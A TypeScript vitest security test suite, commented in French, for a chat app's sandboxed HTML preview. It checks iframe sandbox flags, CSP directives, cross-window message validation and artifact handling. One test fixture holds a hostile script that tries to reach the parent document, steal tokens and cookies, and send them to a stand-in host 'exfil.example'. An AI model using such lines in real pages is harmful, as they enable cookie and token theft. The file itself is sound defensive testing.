import { readFileSync } from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";
import {
  buildSandboxDocument,
  MAX_SANDBOX_DOC_CHARS,
  MAX_SANDBOX_LOG_CHARS,
  readSandboxLogMessage,
  SANDBOX_CSP,
  SANDBOX_CSP_META,
  SANDBOX_IFRAME_SANDBOX,
} from "@/lib/security/sandbox";

const ROOT = path.resolve(import.meta.dirname, "..", "..");

function source(file: string): string {
  return readFileSync(path.join(ROOT, file), "utf8");
}

// Analyse du code seul : les commentaires expliquent ce qui a été retiré et
// citent donc volontairement les attributs dangereux. Les assertions portent
// sur le code exécutable, jamais sur la prose.
function codeOnly(file: string): string {
  return source(file)
    .replace(/\/\*[\s\S]*?\*\//g, " ")
    .replace(/(^|\s)\/\/[^\n]*/g, " ");
}

// Contenu typique produit par le modèle : HTML + Tailwind + React CDN. C'est du
// contenu NON fiable (le modèle peut être détourné par injection de prompt,
// l'utilisateur peut coller n'importe quoi), il ne doit jamais obtenir
// l'origine de l'application.
const HOSTILE = `<!DOCTYPE html>
<html><head><title>demo</title></head>
<body>
<script>
  // Tentatives d'évasion que la sandbox doit rendre impossibles.
  try { parent.document.body.textContent = "owned"; } catch (e) {}
  try { localStorage.setItem("mai-token", "stolen"); } catch (e) {}
  try { document.cookie = "x=1"; } catch (e) {}
  try { location.href = "https://exfil.example/steal"; } catch (e) {}
  try { fetch("https://exfil.example/steal", { body: document.cookie }); } catch (e) {}
</script>
</body></html>`;

describe("Sandbox HTML — isolation de l'origine", () => {
  it("n'accorde que allow-scripts : jamais allow-same-origin ni allow-modals", () => {
    expect(SANDBOX_IFRAME_SANDBOX).toBe("allow-scripts");
    expect(SANDBOX_IFRAME_SANDBOX).not.toContain("allow-same-origin");
    expect(SANDBOX_IFRAME_SANDBOX).not.toContain("allow-modals");
  });

  it("compose l'iframe du chat uniquement via la constante durcie", () => {
    const component = codeOnly("components/chat/sandbox-preview.tsx");
    expect(component).toContain("sandbox={SANDBOX_IFRAME_SANDBOX}");
    // Aucune valeur brute ne doit pouvoir réintroduire l'origine partagée.
    expect(component).not.toContain("allow-same-origin");
    expect(component).not.toContain("allow-modals");
    expect(component).not.toMatch(/sandbox="[^"]*allow-scripts[^"]*"/);
  });

  it("ferme les canaux d'exfiltration et de navigation via la CSP", () => {
    expect(SANDBOX_CSP).toContain("default-src 'none'");
    expect(SANDBOX_CSP).toContain("connect-src 'none'");
    expect(SANDBOX_CSP).toContain("form-action 'none'");
    expect(SANDBOX_CSP).toContain("base-uri 'none'");
    expect(SANDBOX_CSP).toContain("object-src 'none'");
    expect(SANDBOX_CSP).toContain("frame-src 'none'");
    // Un `script-src` restreint reste nécessaire aux CDN d'aperçu.
    expect(SANDBOX_CSP).toContain("script-src 'unsafe-inline' 'unsafe-eval' https:");
    expect(SANDBOX_CSP_META).toContain(`content="${SANDBOX_CSP}"`);
  });

  it("injecte la CSP avant toute balise exécutable du contenu fourni", () => {
    const doc = buildSandboxDocument({
      content: HOSTILE,
      reactMode: false,
      tailwindEnabled: false,
    });
    const cspIndex = doc.indexOf("Content-Security-Policy");
    const firstScriptIndex = doc.indexOf("<script");
    expect(cspIndex).toBeGreaterThan(-1);
    expect(firstScriptIndex).toBeGreaterThan(-1);
    expect(cspIndex).toBeLessThan(firstScriptIndex);
  });

  it("conserve le contenu, l'ajoute dans <head> et gère un document sans <html>", () => {
    const doc = buildSandboxDocument({
      content: HOSTILE,
      reactMode: true,
      tailwindEnabled: true,
    });
    expect(doc).toContain("owned");
    expect(doc).toContain("cdn.tailwindcss.com");
    expect(doc).toContain("unpkg.com/react@18");
    expect(doc.match(/<head[^>]*>/gi)?.length).toBe(1);

    const fragment = buildSandboxDocument({
      content: "<p>bonjour</p>",
      reactMode: false,
      tailwindEnabled: false,
    });
    expect(fragment.startsWith("<!DOCTYPE html>")).toBe(true);
    expect(fragment).toContain("<p>bonjour</p>");
  });

  it("borne la taille du document accepté", () => {
    const huge = `<p>${"a".repeat(MAX_SANDBOX_DOC_CHARS + 5000)}</p>`;
    const doc = buildSandboxDocument({
      content: huge,
      reactMode: false,
      tailwindEnabled: false,
    });
    expect(doc.length).toBeLessThan(huge.length);
    expect(doc.length).toBeLessThan(MAX_SANDBOX_DOC_CHARS + 4000);
  });
});

describe("Pont console — messages inter-fenêtres", () => {
  const frameWindow = { id: "frame" } as unknown as Window;
  const otherWindow = { id: "autre-onglet" } as unknown as Window;

  it("accepte un message émis par la frame de l'aperçu", () => {
    expect(
      readSandboxLogMessage({
        data: { __maiSandbox: true, level: "warn", text: "attention" },
        expectedWindow: frameWindow,
        source: frameWindow,
      })
    ).toEqual({ level: "warn", text: "attention" });
  });

  it("rejette un message forgé par une autre fenêtre (origine émettricemême valide)", () => {
    expect(
      readSandboxLogMessage({
        data: { __maiSandbox: true, level: "error", text: "faux log" },
        expectedWindow: frameWindow,
        source: otherWindow,
      })
    ).toBeNull();
    expect(
      readSandboxLogMessage({
        data: { __maiSandbox: true, level: "error", text: "faux log" },
        expectedWindow: null,
        source: frameWindow,
      })
    ).toBeNull();
  });

  it("rejette les charges malformées (schéma non conforme)", () => {
    const reject = (data: unknown) =>
      readSandboxLogMessage({ data, expectedWindow: frameWindow, source: frameWindow });
    expect(reject(null)).toBeNull();
    expect(reject("__maiSandbox")).toBeNull();
    expect(reject(["__maiSandbox"])).toBeNull();
    expect(reject({})).toBeNull();
    expect(reject({ __maiSandbox: "true" })).toBeNull();
    expect(reject({ __maiSandbox: 1 })).toBeNull();
    expect(reject({ text: "log sans marqueur" })).toBeNull();
  });

  it("normalise un niveau inconnu et borne le texte reçu", () => {
    const message = readSandboxLogMessage({
      data: {
        __maiSandbox: true,
        level: "fatal",
        text: "x".repeat(MAX_SANDBOX_LOG_CHARS + 1000),
      },
      expectedWindow: frameWindow,
      source: frameWindow,
    });
    expect(message?.level).toBe("log");
    expect(message?.text.length).toBe(MAX_SANDBOX_LOG_CHARS);
  });

  it("n'accepte pas un texte non textuel (prototype/objet piégé)", () => {
    const message = readSandboxLogMessage({
      data: { __maiSandbox: true, level: "log", text: { toString: () => "boom" } },
      expectedWindow: frameWindow,
      source: frameWindow,
    });
    expect(message?.text).toBe("");
  });
});

describe("Ouverture hors iframe — artifacts html", () => {
  it("ne place jamais de HTML non fiable dans une fenêtre de l'application", () => {
    const artifact = codeOnly("artifacts/html/client.tsx");
    // Ouvrir un blob d'HTML dans un nouvel onglet donnait au document ouvert
    // l'origine de l'app (accès window.opener, cookies, stockage) : remplacé
    // par un téléchargement de fichier.
    expect(artifact).not.toContain("window.open");
    expect(artifact).toContain("a.download");
    expect(artifact).toContain("URL.revokeObjectURL(url)");
  });
});
